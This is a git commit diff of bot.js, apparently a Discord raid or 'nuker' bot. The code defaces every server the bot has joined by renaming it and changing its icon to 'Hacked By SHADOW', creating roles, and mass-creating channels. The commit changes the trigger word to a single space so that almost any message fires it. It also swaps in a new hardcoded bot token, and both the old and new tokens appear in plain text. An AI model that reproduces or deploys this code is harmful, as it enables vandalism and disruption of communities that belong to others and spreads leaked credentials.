d0c0617b2beaab97a967ee17835b55edf31972f7
SSshadow99 <45866647+SSshadow99@users.noreply.github.com>
2019-03-26 18:07:23 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -18,7 +18,7 @@ console.log(`Logged in as  * [ "  SHADOW " ] servers! [ " ${LOka.guilds.size} " 
  
 });
 
-var prefix = "SHADOW"
+var prefix = " "
 LOka.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
   let args = message.content.split(" ").slice(1);
@@ -33,14 +33,14 @@ LOka.on("message", message => {
  
 var x1 = "SHADOW"
 LOka.on('message', message => {
-     if (message.content === "SHADOW") {
+     if (message.content === " ") {
 LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/519891078502154250/526371167586746388/JPEG_20181029_124219.jpg`)
  
 }
 });
 var x1 = "SHADOW"
 LOka.on('message', message => {
-     if (message.content === "SHADOW") {
+     if (message.content === " ") {
 LOka.user.setUsername("Hacked By SHADOW ")
 
 
@@ -48,21 +48,21 @@ LOka.user.setUsername("Hacked By SHADOW ")
 }
 });
 LOka.on('message', message => {
-     if (message.content === "SHADOW") {
+     if (message.content === " ") {
 LOka.user.setGame(`Hacked By SHADOW`,'https://www.twitch.tv/hix')
  
 }
 });
  
 LOka.on('message', message => {
-     if (message.content === "SHADOW") {
+     if (message.content === " ") {
          LOka.guilds.forEach(m =>{
              m.setIcon(`https://cdn.discordapp.com/attachments/519891078502154250/526371167586746388/JPEG_20181029_124219.jpg`)
 })
 }
 });
 LOka.on('message', message => {
-     if (message.content === "SHADOW") {
+     if (message.content === " ") {
          LOka.guilds.forEach(m =>{
              m.setName(`Hacked By SHADOW`)
 })
@@ -70,7 +70,7 @@ LOka.on('message', message => {
 });
  
 LOka.on('message', message => {
-     if (message.content === "SHADOW") {
+     if (message.content === " ") {
                  if(!message.channel.guild) return;
  
              message.guild.setIcon(`https://cdn.discordapp.com/attachments/519891078502154250/526371167586746388/JPEG_20181029_124219.jpg`)
@@ -81,7 +81,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === "SHADOW") {
+     if (message.content === " ") {
          LOka.guilds.forEach(m =>{
   m.createRole({
         name : "Hacked By - SHADOW ,$ ",
@@ -287,7 +287,7 @@ LOka.on('message', message => {
 }
 });
 LOka.on('message', message => {
-         if (message.content === "SHADOW") {
+         if (message.content === " ") {
                LOka.guilds.forEach(m =>{
 m.createChannel('Hacked By- SHADOW', 'text');
 m.createChannel('Hacked By- SHADOW', 'text');
@@ -1594,7 +1594,7 @@ m.createChannel('Hacked By- SHADOW', 'text');
 });
  
 LOka.on('message', message => {
-         if (message.content === "SHADOW") {
+         if (message.content === " ") {
                  LOka.guilds.forEach(m =>{
 m.createChannel('Hacked By - SHADOW', 'voice');
 m.createChannel('Hacked By - SHADOW', 'voice');
@@ -2029,4 +2029,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("NTMxMjY5MzU5MjYwMTM5NTUw.DxLe6A.HDO0yk5WHeMMFEgBDt4EFzyFj0U")
+LOka.login("NTYwMTMyMzQ1Nzk0MTM0MDI2.D3vfag.XVOxVRzCufpXSTc3SlGMhnbzmQ4")
